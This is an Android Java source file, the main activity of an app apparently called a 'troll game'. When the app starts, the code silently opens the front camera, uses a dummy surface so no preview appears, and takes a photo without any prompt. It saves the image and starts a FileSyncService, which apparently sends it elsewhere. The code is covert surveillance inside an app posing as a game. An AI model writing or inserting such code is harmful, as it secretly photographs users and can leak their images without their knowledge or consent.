package fr.insa_lyon.bg4if.trollgame;

import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;

import java.io.BufferedOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;


public class MainActivity extends ActionBarActivity {

    public static final String TAG = MainActivity.class.getName();


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.d(TAG, "Activity created");

        final Camera cam = openFrontFacingCameraGingerbread();

        if (cam != null) {
            Log.d(TAG, "Camera available");

            SurfaceTexture dummy = new SurfaceTexture(0);

            try {
                cam.setPreviewTexture(dummy);
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            Log.d(TAG, "Preview texture set");

            Camera.Parameters parameters = cam.getParameters();
            parameters.set("camera-id", 2);
            cam.setParameters(parameters);
            cam.startPreview();

            Log.d(TAG, "Preview started");

            cam.takePicture(null, null, new Camera.PictureCallback() {

                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    Log.d(TAG, "Image taken");

                    cam.stopPreview();

                    Log.d(TAG, "Preview stopped");

                    cam.release();


                    Log.d(TAG, "Camera released");

                    try {
                        FileOutputStream fos = MainActivity.this.openFileOutput("test.jpg", MODE_PRIVATE);
                        fos.write(data);
                        fos.close();

                        FileSyncService.startSync(MainActivity.this);
                    } catch (FileNotFoundException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                }
            });
        }
    }

    private Camera openFrontFacingCameraGingerbread() {
        int cameraCount = 0;
        Camera cam = null;
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        cameraCount = Camera.getNumberOfCameras();
        for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
            Camera.getCameraInfo(camIdx, cameraInfo);
            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                try {
                    cam = Camera.open(camIdx);
                } catch (RuntimeException e) {
                    Log.e(TAG, "Camera failed to open: " + e.getLocalizedMessage());
                }
            }
        }

        return cam;
    }

    private Camera getCamera() {
        Camera cam = null;

        try {
            cam = Camera.open();
        } catch (RuntimeException e) {
            Log.e(TAG, "Camera not available", e);
        }

        return cam;
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
